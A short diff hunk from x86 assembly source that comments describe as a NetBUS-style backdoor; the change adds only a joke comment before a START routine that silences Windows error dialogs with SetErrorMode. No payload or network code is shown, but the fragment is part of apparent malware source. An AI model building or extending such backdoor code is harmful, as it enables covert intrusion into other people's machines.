@@ -175,6 +175,8 @@ END_NEWS_MESSAGE:
 ;; as thze NetBUS/NezBIOS backdoor. Have fun :D
                 .CODE
                 DB          "[-T2IR-]"", 0
+                
+;; beginning the horror lmao
 START:
                 PUSH        SEM_NOGPFAULTERRORBOX   ;; On error, just swim further
                 CALL        SetErrorMode            ;; Whithout having a junk
